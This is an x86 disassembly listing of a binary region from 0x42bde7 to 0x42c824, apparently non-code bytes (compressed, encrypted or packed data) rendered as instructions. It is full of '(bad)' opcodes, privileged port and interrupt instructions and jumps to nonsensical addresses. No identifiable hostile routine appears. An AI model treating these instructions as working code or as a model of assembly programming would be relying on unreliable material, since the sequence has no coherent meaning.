  42bde7:	neg    BYTE PTR [ebx-0x69e80e21]
  42bded:	mov    ah,0xd
  42bdef:	adc    al,BYTE PTR [ebx+eax*1+0x32]
  42bdf3:	sbb    ch,BYTE PTR [esi-0x27]
  42bdf6:	pop    ds
  42bdf7:	mov    DWORD PTR [edx+0x75],ecx
  42bdfa:	xor    eax,0x2628a5c7
  42bdff:	push   esi
  42be00:	popf   
  42be01:	ins    BYTE PTR es:[edi],dx
  42be02:	in     al,dx
  42be03:	pushf  
  42be04:	xchg   esp,eax
  42be05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be06:	dec    ebx
  42be07:	jg     0x42bdcf
  42be09:	jae    0x42bdd6
  42be0b:	xor    ch,ch
  42be0d:	push   eax
  42be0e:	jns    0x42bd97
  42be10:	fistp  DWORD PTR [esi+0x5fcc8d4f]
  42be16:	lock je 0x42be7f
  42be19:	mov    cl,0xb1
  42be1b:	or     al,0xfb
  42be1d:	push   0x48
  42be1f:	hlt    
  42be20:	push   esp
  42be21:	cmp    ah,BYTE PTR [ebx+0x14194d71]
  42be27:	cmp    DWORD PTR [edi],ecx
  42be29:	push   0x9cf6cdd
  42be2e:	(bad)  
  42be30:	ss push esp
  42be32:	enter  0xdba6,0x7f
  42be36:	push   0xdd5d682f
  42be3b:	sbb    cl,BYTE PTR [ebx]
  42be3d:	(bad)  
  42be3e:	repz (bad) 
  42be40:	mov    dl,0x1b
  42be42:	mov    BYTE PTR ss:[edx-0x4467ac1b],bh
  42be49:	in     al,dx
  42be4a:	ja     0x42be68
  42be4c:	add    BYTE PTR [ebp+0x1990e98e],cl
  42be52:	mov    esp,0xed840e13
  42be57:	adc    BYTE PTR [edi],dh
  42be59:	pop    eax
  42be5a:	cmp    DWORD PTR ds:0x5ad45449,esi
  42be60:	fisub  WORD PTR ss:[eax+0x7c7e23c3]
  42be67:	fdivr  QWORD PTR [ebx-0x37]
  42be6a:	jmp    0x42be56
  42be6c:	das    
  42be6d:	arpl   WORD PTR [ebx],di
  42be6f:	jb     0x42be90
  42be71:	mov    ds:0x88784556,eax
  42be76:	adc    DWORD PTR ds:[ebx],edx
  42be79:	out    dx,al
  42be7a:	mov    BYTE PTR [ebp-0x14],bh
  42be7d:	fcomip st,st(1)
  42be7f:	out    0x9,eax
  42be81:	inc    esi
  42be82:	(bad)  
  42be83:	mov    ds:0x375c0b6,eax
  42be88:	jge    0x42be8a
  42be8a:	ror    esi,cl
  42be8c:	pop    esp
  42be8d:	push   ss
  42be8e:	adc    al,0xc2
  42be90:	mov    dh,0x0
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0xb07bd7c8,eax
  42bf01:	mov    esi,0xd6dc7869
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0xb9000001
  42bf0d:	lods   al,BYTE PTR ds:[esi]
  42bf0e:	popf   
  42bf0f:	in     al,dx
  42bf10:	mov    eax,0xb27dea8a
  42bf15:	push   edi
  42bf16:	jne    0x42bf09
  42bf18:	or     bh,dl
  42bf1a:	repnz scas eax,DWORD PTR es:[edi]
  42bf1c:	in     eax,0x15
  42bf1e:	dec    esp
  42bf1f:	lock jns 0x42bf05
  42bf22:	push   edi
  42bf23:	cmp    eax,0xd06332a0
  42bf28:	cs std 
  42bf2a:	jmp    0xcd86ca1d
  42bf2f:	aam    0x14
  42bf31:	cmp    al,BYTE PTR [edi+0x1ad2bec7]
  42bf37:	mov    dh,0x48
  42bf39:	pop    ecx
  42bf3a:	jns    0x42bf69
  42bf3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf3d:	jle    0x42bfa5
  42bf3f:	iret   
  42bf40:	clc    
  42bf41:	stos   DWORD PTR es:[edi],eax
  42bf42:	and    BYTE PTR [esi+0x11],0xae
  42bf46:	jmp    0x42beec
  42bf48:	fmul   QWORD PTR [ebp-0x7f]
  42bf4b:	stc    
  42bf4c:	jle    0x42bf92
  42bf4e:	dec    ebx
  42bf4f:	xchg   edi,eax
  42bf50:	jo     0x42bf0d
  42bf52:	aas    
  42bf53:	cmp    DWORD PTR [edi-0x19],ecx
  42bf56:	mov    edi,0x4c257eb8
  42bf5b:	inc    edi
  42bf5c:	out    dx,al
  42bf5d:	dec    ebp
  42bf5e:	or     al,0x65
  42bf60:	xchg   ebx,eax
  42bf61:	lea    esp,[ebx]
  42bf63:	mov    eax,ds:0x31ef0803
  42bf68:	fadd   QWORD PTR [ebx*4+0x607831da]
  42bf6f:	xlat   BYTE PTR ds:[ebx]
  42bf70:	fistp  DWORD PTR [ebx+0x32c012a4]
  42bf76:	sub    eax,0xbc880ee
  42bf7b:	outs   dx,DWORD PTR ds:[esi]
  42bf7c:	stos   DWORD PTR es:[edi],eax
  42bf7d:	sar    DWORD PTR [eax],0xb3
  42bf80:	fldcw  WORD PTR [eax+0x225ea5d1]
  42bf86:	ret    0x8ff9
  42bf89:	add    dh,ch
  42bf8b:	pop    eax
  42bf8c:	add    esi,edx
  42bf8e:	mov    WORD PTR [esi-0x46f98092],?
  42bf94:	cdq    
  42bf95:	fld    QWORD PTR [ebx+0x1527a838]
  42bf9b:	inc    ebx
  42bf9c:	jg     0x42bfce
  42bf9e:	pop    ebx
  42bf9f:	ror    DWORD PTR [eax-0x5d],0x83
  42bfa3:	(bad)  
  42bfa5:	std    
  42bfa6:	icebp  
  42bfa7:	push   edx
  42bfa8:	jmp    FWORD PTR [ebp+0x1e]
  42bfab:	stos   DWORD PTR es:[edi],eax
  42bfac:	cli    
  42bfad:	xor    eax,0x74627389
  42bfb2:	fwait
  42bfb3:	(bad)  
  42bfb4:	jl     0x42bf53
  42bfb6:	sub    eax,0xe24aec3e
  42bfbb:	xchg   edx,eax
  42bfbc:	(bad)  
  42bfbd:	and    DWORD PTR [ecx+ecx*2-0x69],edx
  42bfc1:	iret   
  42bfc2:	sbb    al,0x57
  42bfc4:	jmp    0x42bf86
  42bfc6:	hlt    
  42bfc7:	xchg   BYTE PTR [esi+edx*8],dl
  42bfca:	adc    esp,esp
  42bfcc:	es xchg edx,eax
  42bfce:	stc    
  42bfcf:	data16 mov al,0x6a
  42bfd2:	dec    edi
  42bfd3:	data16 stc 
  42bfd5:	arpl   WORD PTR [esi-0x45954bd9],sp
  42bfdb:	imul   esi,DWORD PTR [ebp-0x1ba7b9ec],0xffffffe0
  42bfe2:	sbb    eax,0xc71c2e4c
  42bfe7:	outs   dx,BYTE PTR ds:[esi]
  42bfe8:	ja     0x42c028
  42bfea:	ins    DWORD PTR es:[edi],dx
  42bfeb:	cli    
  42bfec:	mov    ebx,DWORD PTR [esi-0x638dabc7]
  42bff2:	adc    al,0x96
  42bff4:	mov    ds:0xb20f208f,al
  42bff9:	in     al,0xa
  42bffb:	add    edx,DWORD PTR [edi+0x7d]
  42bffe:	jge    0x42bfcc
  42c000:	ror    DWORD PTR [eax+0x22108be],1
  42c006:	mov    cl,0x94
  42c008:	mov    cl,0x7a
  42c00a:	inc    esi
  42c00b:	jg     0x42bfa8
  42c00d:	arpl   WORD PTR ds:0x2d9c,bp
	...
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	int3   
  42c081:	out    dx,al
  42c082:	mov    dl,0x80
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x1e000001
  42c08d:	push   cs
  42c08e:	data16 loop 0x42c0f1
  42c091:	cld    
  42c092:	sbb    al,bl
  42c094:	addr16 call 0x373da7ff
  42c09a:	xchg   ebx,eax
  42c09b:	adc    dh,BYTE PTR [eax]
  42c09d:	xchg   ebx,eax
  42c09e:	mov    ?,WORD PTR cs:[esi]
  42c0a1:	dec    eax
  42c0a2:	sub    ecx,DWORD PTR [edi+0xa]
  42c0a5:	sub    BYTE PTR [edi],bh
  42c0a7:	enter  0xb5fb,0x99
  42c0ab:	sub    BYTE PTR [ecx-0x6f493774],ch
  42c0b1:	fidivr WORD PTR [ebp+0x14]
  42c0b4:	ds push esi
  42c0b6:	leave  
  42c0b7:	sub    DWORD PTR [edx+0x7b630c3a],ebx
  42c0bd:	add    BYTE PTR [ebx],0xc0
  42c0c0:	inc    ebp
  42c0c1:	ret    
  42c0c2:	cmp    DWORD PTR [ebx-0x40],edx
  42c0c5:	ss je  0x42c112
  42c0c8:	test   DWORD PTR [edi-0x72],esi
  42c0cb:	test   DWORD PTR [esi-0x323e6765],0x8aef3dc1
  42c0d5:	(bad)  
  42c0d6:	xchg   edx,eax
  42c0d7:	repz adc bh,BYTE PTR [ebx]
  42c0da:	and    BYTE PTR [ecx],0xad
  42c0dd:	data16 fst QWORD PTR [edx+0x311554c0]
  42c0e4:	dec    eax
  42c0e5:	pop    edi
  42c0e6:	pop    esi
  42c0e7:	not    edx
  42c0e9:	test   DWORD PTR [ebx+0x54],esi
  42c0ec:	jae    0x42c088
  42c0ee:	shr    BYTE PTR [edi-0x24],0x4d
  42c0f2:	aam    0x15
  42c0f4:	(bad)  
  42c0f5:	pop    ss
  42c0f6:	fstp   st(7)
  42c0f8:	xor    DWORD PTR [ecx-0x48c58774],esi
  42c0fe:	xchg   ebx,eax
  42c0ff:	mov    edi,0xc89e7d7
  42c104:	pop    edx
  42c105:	aas    
  42c106:	or     ah,BYTE PTR [eax+eiz*8]
  42c109:	push   es
  42c10a:	mov    ecx,0x1e50e9aa
  42c10f:	jg     0x42c0ad
  42c111:	jle    0x42c0d7
  42c113:	push   esi
  42c114:	test   eax,0x4b1498a6
  42c119:	dec    esp
  42c11a:	mov    edx,0x7a1fc71a
  42c11f:	push   esp
  42c120:	or     dh,ch
  42c122:	or     ch,ah
  42c124:	cmp    BYTE PTR [esp+eax*1],dl
  42c127:	repz and eax,edx
  42c12a:	nop
  42c12b:	fld    DWORD PTR [edi]
  42c12d:	(bad)  
  42c12e:	lahf   
  42c12f:	bound  esp,QWORD PTR [edx+0x41]
  42c132:	and    BYTE PTR [edx+0x386c066e],dh
  42c138:	xchg   esi,eax
  42c139:	mov    cl,0xf8
  42c13b:	repnz pop ebp
  42c13d:	(bad)  
  42c13e:	jmp    0xa132:0x54d331bd
  42c145:	fnstenv [ebx-0x6a]
  42c148:	mov    edi,0xdbda0290
  42c14d:	fadd   QWORD PTR [eax+0x64]
  42c150:	or     eax,0x76b9d511
  42c155:	loope  0x42c124
  42c157:	xchg   esp,eax
  42c158:	lock fdivr QWORD PTR [eax+esi*8+0x245b0fe7]
  42c160:	adc    esp,esi
  42c162:	test   BYTE PTR [esi],al
  42c164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c165:	imul   eax,DWORD PTR [esi+0x24012bdb],0xffffff8d
  42c16c:	cmp    eax,0xb766ee53
  42c171:	inc    esi
  42c172:	loopne 0x42c190
  42c174:	loop   0x42c1a9
  42c176:	gs ffreep st(3)
  42c179:	ror    DWORD PTR [eax],cl
  42c17b:	outs   dx,BYTE PTR ds:[esi]
  42c17c:	out    0x28,eax
  42c17e:	popa   
  42c17f:	aas    
  42c180:	ins    DWORD PTR es:[edi],dx
  42c181:	fucomp st(0)
  42c183:	push   ecx
  42c184:	sti    
  42c185:	ins    BYTE PTR es:[edi],dx
  42c186:	add    al,0x41
  42c188:	(bad)  
  42c189:	sahf   
  42c18a:	imul   edi,DWORD PTR [edx+0x3598720a],0xc1
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	or     al,0xe0
  42c202:	pop    eax
  42c203:	mov    esp,0x1d8e6
  42c208:	add    eax,0xaa000001
  42c20d:	push   ebx
  42c20e:	pop    esp
  42c20f:	dec    esi
  42c210:	pop    ds
  42c211:	push   ds
  42c212:	mov    ds:0x6fa51c88,eax
  42c217:	stc    
  42c218:	outs   dx,BYTE PTR ds:[esi]
  42c219:	mov    eax,ds:0xd995ae80
  42c21e:	sub    eax,0x908d5a4a
  42c223:	test   DWORD PTR [eax+0x3e329558],ebp
  42c229:	cmp    ebx,esp
  42c22b:	or     edi,esp
  42c22d:	adc    BYTE PTR [edx+0x2b80036e],dl
  42c233:	and    ah,ch
  42c235:	das    
  42c236:	adc    DWORD PTR [ebp+0x75],eax
  42c239:	dec    esp
  42c23a:	push   ds
  42c23b:	pop    edx
  42c23c:	fild   WORD PTR [eax+0x53]
  42c23f:	imul   esi,edi,0x157f7f9f
  42c245:	mov    ds:0x8c2f6e5a,al
  42c24a:	test   al,0xda
  42c24c:	retf   0x47be
  42c24f:	sti    
  42c250:	in     al,0xbc
  42c252:	sar    BYTE PTR [edi-0x6d],1
  42c255:	stos   BYTE PTR es:[edi],al
  42c256:	fwait
  42c257:	cwde   
  42c258:	daa    
  42c259:	addr16 xor eax,0x4efa3fe0
  42c25f:	cmp    ebp,DWORD PTR [ebx+0x2033735c]
  42c265:	sbb    eax,0x6cc335ee
  42c26a:	cdq    
  42c26b:	fstp   st(0)
  42c26d:	xor    ecx,DWORD PTR [ecx-0x636163c9]
  42c273:	or     eax,0x589bff5a
  42c278:	xor    edx,DWORD PTR [ebx]
  42c27a:	mov    WORD PTR [esi],?
  42c27c:	ja     0x42c226
  42c27e:	jle    0x42c236
  42c280:	mov    al,ds:0xd8201e0a
  42c285:	sub    edi,esi
  42c287:	push   0x74936709
  42c28c:	sar    DWORD PTR [edx],1
  42c28e:	leave  
  42c28f:	stos   BYTE PTR es:[edi],al
  42c290:	int    0x59
  42c292:	and    eax,0xb6b3dd64
  42c297:	sbb    cl,BYTE PTR [eax+0x527d2247]
  42c29d:	xchg   BYTE PTR [edx+ebp*2-0x3f62a668],bl
  42c2a4:	cmp    al,0xeb
  42c2a6:	stos   DWORD PTR es:[edi],eax
  42c2a7:	jge    0x42c29d
  42c2a9:	pop    ss
  42c2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2ab:	add    eax,0x30f0bff2
  42c2b0:	shl    BYTE PTR [edx+0x726ee84a],cl
  42c2b6:	std    
  42c2b7:	add    ebx,DWORD PTR [edx+0x2132232]
  42c2bd:	aam    0xb3
  42c2bf:	(bad)  
  42c2c0:	pop    ss
  42c2c1:	mov    eax,0x54423b6b
  42c2c6:	enter  0x7920,0x30
  42c2ca:	imul   edi,ebx,0x6bfbd18b
  42c2d0:	jg     0x42c25a
  42c2d2:	imul   esp,DWORD PTR [edx-0x25],0xffffff98
  42c2d6:	imul   edi,DWORD PTR [esi],0x2c9fcba1
  42c2dc:	popf   
  42c2dd:	cmp    eax,DWORD PTR ds:0x1dd1457d
  42c2e3:	sbb    BYTE PTR [ebp-0x7f],al
  42c2e6:	sub    cl,BYTE PTR [esi-0x18]
  42c2e9:	shl    ecx,1
  42c2eb:	sahf   
  42c2ec:	or     DWORD PTR [edi-0x4b],ecx
  42c2ef:	jb     0x42c367
  42c2f1:	(bad)  [esi+0x4a]
  42c2f4:	popa   
  42c2f5:	(bad)  
  42c2f6:	inc    ecx
  42c2f7:	lea    esi,[eax+esi*4-0x72]
  42c2fb:	jb     0x42c346
  42c2fd:	xor    eax,0xdd18beb
  42c302:	mov    ah,0x8b
  42c304:	jp     0x42c329
  42c306:	in     al,0xf4
  42c308:	cmp    BYTE PTR [edx*2-0x6d769361],al
  42c30f:	xor    esp,DWORD PTR [ebx+0x0]
	...
  42c372:	add    BYTE PTR [eax],al
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x9f98ff6
  42c383:	cld    
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0x94000001
  42c38d:	push   ebx
  42c38e:	adc    ah,BYTE PTR [ebx+ecx*4+0x30]
  42c392:	jmp    0x75712aa3
  42c397:	stos   DWORD PTR es:[edi],eax
  42c398:	xor    dh,BYTE PTR [ebx]
  42c39a:	mov    ecx,0xaf136ab9
  42c39f:	fsub   DWORD PTR [ecx+ecx*1+0x71a37453]
  42c3a6:	jmp    0x2340def0
  42c3ab:	mov    dh,0x3f
  42c3ad:	aam    0x72
  42c3af:	(bad)  
  42c3b0:	hlt    
  42c3b1:	cmp    al,dl
  42c3b3:	xchg   esp,eax
  42c3b4:	cmp    eax,0xe11c0fe3
  42c3b9:	mov    eax,0x1c3fd469
  42c3be:	leave  
  42c3bf:	shr    DWORD PTR [esi-0x3d],0x8e
  42c3c3:	arpl   WORD PTR [eax],dx
  42c3c5:	inc    esi
  42c3c6:	or     al,0x1e
  42c3c8:	inc    eax
  42c3c9:	jmp    0x42c354
  42c3cb:	fdivr  DWORD PTR [ecx]
  42c3cd:	pop    ecx
  42c3ce:	push   ecx
  42c3cf:	gs jno 0x42c390
  42c3d2:	ins    BYTE PTR es:[edi],dx
  42c3d3:	xor    bl,BYTE PTR [ebx]
  42c3d5:	fiadd  WORD PTR [ebx-0x7a5d3c5f]
  42c3db:	sbb    al,al
  42c3dd:	mov    dh,0x59
  42c3df:	sub    DWORD PTR [edi+ecx*8-0x23],edi
  42c3e3:	or     al,0x4
  42c3e5:	mov    ebp,0x6b1f3c6b
  42c3ea:	enter  0xaeeb,0x2a
  42c3ee:	clc    
  42c3ef:	bound  eax,QWORD PTR [ebx-0x51]
  42c3f2:	sbb    eax,0xc2bfbd4
  42c3f7:	das    
  42c3f8:	inc    edx
  42c3f9:	adc    WORD PTR [ecx],cx
  42c3fc:	ror    dl,0x30
  42c3ff:	adc    al,0x6f
  42c401:	push   edi
  42c402:	test   BYTE PTR [ebx],cl
  42c404:	ss imul esp,edx,0x22
  42c408:	xor    al,0x97
  42c40a:	mov    bl,0x63
  42c40c:	cmp    ah,BYTE PTR [ecx+0x53]
  42c40f:	shl    esp,0xcf
  42c412:	jmp    0x1af4:0xd05d6cc0
  42c419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c41a:	pop    ds
  42c41b:	pop    ebx
  42c41c:	pop    es
  42c41d:	dec    esi
  42c41e:	adc    dh,BYTE PTR ds:0xf471b340
  42c424:	xor    edi,ebp
  42c426:	call   0xfeeb:0x9a1733c
  42c42d:	retf   0x9466
  42c430:	dec    esi
  42c431:	inc    ebx
  42c432:	mov    dl,0x5d
  42c434:	sub    eax,0x6e8804a0
  42c439:	addr16 inc edx
  42c43b:	sub    DWORD PTR [ecx+esi*4-0x6d],0xffffffcc
  42c440:	sbb    al,ah
  42c442:	sar    DWORD PTR [ebx],0x23
  42c445:	out    0x89,eax
  42c447:	inc    edx
  42c448:	sbb    dl,BYTE PTR [ecx-0x7]
  42c44b:	std    
  42c44c:	inc    ecx
  42c44d:	xor    eax,0x3df14caa
  42c452:	sbb    dl,BYTE PTR [ecx+0x151cf09b]
  42c458:	outs   dx,BYTE PTR ds:[esi]
  42c459:	add    DWORD PTR [edi],ecx
  42c45b:	sar    BYTE PTR [edx+edi*8],1
  42c45e:	jae    0x42c470
  42c460:	shr    DWORD PTR [ecx-0x4f],1
  42c463:	data16 or BYTE PTR [ecx],0x80
  42c467:	mov    ds:0xddb69a48,eax
  42c46c:	fbld   TBYTE PTR [ecx+0x2fd9e72f]
  42c472:	and    dl,BYTE PTR [edi-0x4dd36834]
  42c478:	je     0x42c413
  42c47a:	es dec esi
  42c47c:	popf   
  42c47d:	out    0x2e,al
  42c47f:	sbb    DWORD PTR [esi],0xd8350c8c
  42c485:	inc    ecx
  42c486:	rol    DWORD PTR [edx],1
  42c488:	lods   eax,DWORD PTR ds:[esi]
  42c489:	pop    ds
  42c48a:	inc    ebp
  42c48b:	cdq    
  42c48c:	pop    ebx
  42c48d:	mov    bh,0x6c
  42c48f:	in     eax,0x34
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xb834,0x30
  42c502:	inc    esp
  42c503:	xchg   ecx,eax
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x3e000001,al
  42c50d:	lds    ebx,FWORD PTR [ebx+0x17f7f135]
  42c513:	mov    esi,0x5d33f8eb
  42c518:	scas   al,BYTE PTR es:[edi]
  42c519:	xor    BYTE PTR ds:0x1c96ee38,dl
  42c51f:	scas   eax,DWORD PTR es:[edi]
  42c520:	add    dl,BYTE PTR [esi]
  42c522:	pop    ebx
  42c523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c524:	in     al,dx
  42c525:	xor    dl,cl
  42c527:	add    bh,0xdf
  42c52a:	push   cs
  42c52b:	std    
  42c52c:	(bad)
  42c52f:	push   cs
  42c530:	push   esp
  42c531:	lahf   
  42c532:	jp     0x42c553
  42c534:	adc    cl,BYTE PTR [eax-0x96d0241]
  42c53a:	outs   dx,BYTE PTR ds:[esi]
  42c53b:	adc    eax,0xad5df30b
  42c540:	pop    edx
  42c541:	clc    
  42c542:	jne    0x42c52b
  42c544:	pushf  
  42c545:	test   eax,0x5730a8bd
  42c54a:	(bad)  [ebp+0x14]
  42c54d:	and    al,0x72
  42c54f:	sbb    DWORD PTR [edi-0x7d0e44c4],edx
  42c555:	popf   
  42c556:	mov    dh,0x98
  42c558:	scas   al,BYTE PTR es:[edi]
  42c559:	fidivr WORD PTR [edx+0x58f6f9]
  42c55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c560:	jnp    0x42c59e
  42c562:	or     BYTE PTR gs:[eax],ah
  42c565:	fmul   DWORD PTR [ebp-0x1c]
  42c568:	ror    DWORD PTR [ecx-0x3c570b7c],0x65
  42c56f:	aas    
  42c570:	xchg   ebx,eax
  42c571:	cmp    BYTE PTR [esi-0x7da759cb],0xa3
  42c578:	add    BYTE PTR cs:[edi+0x43],ah
  42c57c:	push   eax
  42c57d:	inc    esp
  42c57e:	repnz add eax,0x26ae4a0b
  42c584:	call   0x96d36223
  42c589:	adc    ebx,ebp
  42c58b:	xchg   ah,dl
  42c58d:	push   ds
  42c58e:	mov    esp,0x6850d261
  42c593:	loope  0x42c56b
  42c595:	ins    DWORD PTR es:[edi],dx
  42c596:	leave  
  42c597:	test   DWORD PTR [esi-0xeea9e57],ecx
  42c59d:	cmp    ch,bh
  42c59f:	jg     0x42c58c
  42c5a1:	mov    dl,0x87
  42c5a3:	or     ah,BYTE PTR [eax+0x22]
  42c5a6:	fadd   st,st(3)
  42c5a8:	adc    cx,WORD PTR [edi]
  42c5ab:	rcr    BYTE PTR [edx-0x6981881a],1
  42c5b1:	pop    edx
  42c5b2:	test   BYTE PTR [ecx+0x4e9f87f8],dh
  42c5b8:	js     0x42c5fd
  42c5ba:	jl     0x42c5a9
  42c5bc:	mov    dl,0xe3
  42c5be:	lods   al,BYTE PTR ds:[esi]
  42c5bf:	ret    
  42c5c0:	(bad)  
  42c5c1:	sbb    cl,BYTE PTR [esi+esi*8+0x6c0f136a]
  42c5c8:	pop    esi
  42c5c9:	jnp    0x42c5be
  42c5cb:	mov    dl,0x69
  42c5cd:	xor    eax,0x737b7ead
  42c5d2:	adc    eax,0x9af901fb
  42c5d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5d8:	stos   DWORD PTR es:[edi],eax
  42c5d9:	das    
  42c5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5db:	xlat   BYTE PTR ds:[ebx]
  42c5dc:	and    al,0x66
  42c5de:	mov    edx,0x1b7d5cf6
  42c5e3:	push   ebp
  42c5e4:	jge    0x42c631
  42c5e6:	mov    es,edx
  42c5e8:	xor    BYTE PTR ds:0x774fb19,cl
  42c5ee:	dec    edx
  42c5ef:	and    BYTE PTR [esi],al
  42c5f1:	inc    eax
  42c5f2:	(bad)  
  42c5f3:	sbb    BYTE PTR [esi],bh
  42c5f5:	add    eax,0x2f1475f0
  42c5fa:	pop    es
  42c5fb:	pop    ds
  42c5fc:	cmp    al,0xe5
  42c5fe:	add    edx,DWORD PTR [edi+0x5517fbe8]
  42c604:	pop    ebx
  42c605:	div    DWORD PTR [edi+0x3ba4df27]
  42c60b:	aas    
  42c60c:	sub    al,0x99
  42c60e:	mov    al,0x75
  42c610:	dec    esp
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x1f6dfc6b]
  42c681:	std    
  42c682:	mov    ch,0xaf
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xa1000001,al
  42c68d:	jl     0x42c6c5
  42c68f:	add    cl,BYTE PTR [esi+0x45880f31]
  42c695:	mov    DWORD PTR ss:[eax+0xd9054c4],eax
  42c69c:	int3   
  42c69d:	cmp    cl,BYTE PTR [esi+0x58]
  42c6a0:	adc    eax,0x59f02958
  42c6a5:	fadd   st,st(4)
  42c6a7:	das    
  42c6a8:	rcr    BYTE PTR [ecx-0x788c180a],1
  42c6ae:	push   esp
  42c6af:	icebp  
  42c6b0:	push   ds
  42c6b1:	(bad)
  42c6b4:	fwait
  42c6b5:	sbb    BYTE PTR [ecx+0x3b11dd00],bh
  42c6bb:	jno    0x42c730
  42c6bd:	test   eax,0x836014c4
  42c6c2:	jge    0x42c6c2
  42c6c4:	xchg   esi,eax
  42c6c5:	mov    ch,0x39
  42c6c7:	mov    eax,0xb5b92dde
  42c6cc:	mov    dh,0xf3
  42c6ce:	sar    esp,1
  42c6d0:	jnp    0x42c704
  42c6d2:	js     0x42c702
  42c6d4:	mov    BYTE PTR [edi+0x61],bl
  42c6d7:	scas   al,BYTE PTR es:[edi]
  42c6d8:	sbb    BYTE PTR [ebx+0x49],bl
  42c6db:	lods   al,BYTE PTR ds:[esi]
  42c6dc:	iret   
  42c6dd:	adc    ebx,DWORD PTR [ebx-0xfb5beed]
  42c6e3:	xchg   esi,eax
  42c6e4:	xchg   ebp,eax
  42c6e5:	int3   
  42c6e6:	inc    esi
  42c6e8:	dec    esi
  42c6e9:	ja     0x42c69b
  42c6eb:	mov    al,ds:0x643b0eba
  42c6f0:	pop    ss
  42c6f1:	adc    dl,bh
  42c6f3:	shl    al,cl
  42c6f5:	sbb    al,0x9a
  42c6f7:	stos   BYTE PTR es:[edi],al
  42c6f8:	mov    esp,0x59557c0b
  42c6fd:	frstor [edi-0x3]
  42c700:	in     al,0x5f
  42c702:	je     0x42c6fc
  42c704:	out    0xf6,al
  42c706:	aaa    
  42c707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c708:	shr    DWORD PTR [eax+0xb],cl
  42c70b:	lock mov bl,0x30
  42c70e:	xchg   edi,eax
  42c70f:	js     0x42c6a2
  42c711:	int    0x1b
  42c713:	fs addr16 pop edx
  42c716:	je     0x42c73c
  42c718:	jne    0x42c739
  42c71a:	ss inc esp
  42c71c:	pop    esi
  42c71d:	mov    esp,0x3c33a4f6
  42c722:	js     0x42c778
  42c724:	push   edx
  42c725:	cld    
  42c726:	cmp    BYTE PTR [edi],cl
  42c728:	mov    esi,0x1a1dcdb
  42c72d:	es js  0x42c6db
  42c730:	es popa 
  42c732:	leave  
  42c733:	and    cl,BYTE PTR [ecx+0x79]
  42c736:	imul   esp,esp,0x5c0b5fb
  42c73c:	hlt    
  42c73d:	mov    edi,0x19251c62
  42c742:	in     eax,0xe8
  42c744:	cld    
  42c745:	test   eax,0xa46fab1d
  42c74a:	sub    dh,bh
  42c74c:	pop    ecx
  42c74d:	cmp    al,0xd6
  42c74f:	arpl   WORD PTR [eax-0x2e3646d4],di
  42c755:	ja     0x42c6fa
  42c757:	scas   eax,DWORD PTR es:[edi]
  42c758:	jb     0x42c6f7
  42c75a:	mov    esp,0x96840d16
  42c75f:	inc    eax
  42c760:	jbe    0x42c7e0
  42c762:	and    dl,BYTE PTR [ecx]
  42c764:	push   ecx
  42c765:	xlat   BYTE PTR ds:[ebx]
  42c766:	punpckhwd mm7,mm5
  42c769:	mov    ecx,0x7c81a942
  42c76e:	push   esp
  42c76f:	std    
  42c770:	(bad)  
  42c772:	pop    edi
  42c773:	in     al,0x75
  42c775:	ja     0x42c7e3
  42c777:	and    BYTE PTR [ebx],ah
  42c779:	mov    esp,0xde357d06
  42c77e:	ror    DWORD PTR [ebp+eax*1+0x960bf09],0xa6
  42c786:	push   0x19fc1cb6
  42c78b:	mov    ebp,DWORD PTR [edi+0x6a]
  42c78e:	sub    BYTE PTR [ebp+0xa7],ah
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	(bad)  
  42c801:	outs   dx,BYTE PTR ds:[esi]
  42c802:	fdivrp st(0),st
  42c804:	cli    
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x7b000001,al
  42c80d:	jp     0x42c86d
  42c80f:	in     eax,0x71
  42c811:	pop    es
  42c812:	repz repz sub eax,0xaff11650
  42c819:	add    ebx,DWORD PTR ds:0x78232656
  42c81f:	mov    ebp,0x90fe79a1
  42c824:	mov    dh,BYTE PTR [eax+0x36]
